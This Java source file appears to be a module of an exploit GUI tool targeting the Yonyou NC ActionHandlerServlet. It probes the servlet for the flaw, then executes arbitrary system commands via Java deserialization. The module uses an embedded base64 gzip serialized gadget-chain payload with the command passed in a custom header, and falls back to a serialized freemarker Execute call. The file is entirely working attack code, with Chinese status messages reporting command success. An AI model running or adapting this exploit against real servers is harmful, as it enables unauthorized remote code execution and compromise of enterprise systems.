package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.zip.GZIPOutputStream;

public class yongyou_nc_ActionHandlerServlet_serial implements Exploitlnterface {

    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
//        return null;
    }
    public static byte[] byteMerger(byte[] bt1, byte[] bt2) {
        if (bt2 == null) {
            return bt1;
        } else {
            byte[] bt3 = new byte[bt1.length + bt2.length];
            System.arraycopy(bt1, 0, bt3, 0, bt1.length);
            System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length);
            return bt3;
        }
    }
    public static String ActionHandlerServlet(String url,String cmd){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try{
            ObjectOutputStream oos;
            HashMap hm = new HashMap<>();
            hm.put("Content-Type","multipart/form-data;");
            ByteArrayOutputStream bo;
            bo = new ByteArrayOutputStream();
            GZIPOutputStream t2 = new GZIPOutputStream(bo);
            oos = new ObjectOutputStream(t2);
            oos.writeObject("freemarker.template.utility.Execute");
            oos.writeObject("exec");
            ArrayList list;
            list = new ArrayList();
            list.add(cmd);
            oos.writeObject(list);
            oos.writeObject("simpchn");
            oos.writeObject("iufo");
            t2.close();
            t2.close();
            Response res = HttpTools.post_byte(url+"/servlet/~ic/com%2eufida%2ezior%2econsole%2eActionHandlerServlet", byteMerger(bo.toByteArray(), "".getBytes()),hm,"utf-8");
            String var = res.getText();
            return var.substring(var.indexOf("valuexp")+11);

        } catch (Exception var14) {
            return null;
        }

    }

    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response post_res = HttpTools.get(url + "/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet" , head, "utf-8");
            if (post_res.getCode() != 404 && post_res.getCode()!=0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_ActionHandlerServlet_serial ]");
                    textArea.appendText("\n 接口存在，尝试TomcatEcho构造回显");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_DownloadServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        String s = "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";
        try {

            String cmd_echo = yyEcho(url+"/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet",cmd,s);

            if (!cmd_echo.isEmpty()) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+cmd_echo);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n CC6NC链注入失败"+ cmd +" 执行失败！\n 尝试freemarker.template.utility.Execute执行");
                });
                String var = ActionHandlerServlet(url,cmd);
                if(!var.isEmpty()||var!=null){
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd +" 执行成功！");
                        textArea_cmd.appendText("\n"+var);
                    });
                    return true;
                }else{
                    Platform.runLater(() -> {
                        textArea.appendText("\n freemarker.template.utility.Execute注入失败,"+cmd+"执行失败！");
                    });
                    return false;
                }

            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_DownloadServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private static String yyEcho(String url,String cmd,String s) {
        byte[] ss = java.util.Base64.getDecoder().decode(s);
        try{
            HashMap head = new HashMap();
            head.put("R4gCmd",cmd);
            Response res = HttpTools.post_byte(url,ss,head,"gbk");
            return res.getText();
        } catch (Exception e) {
            return null;
        }
    }
}
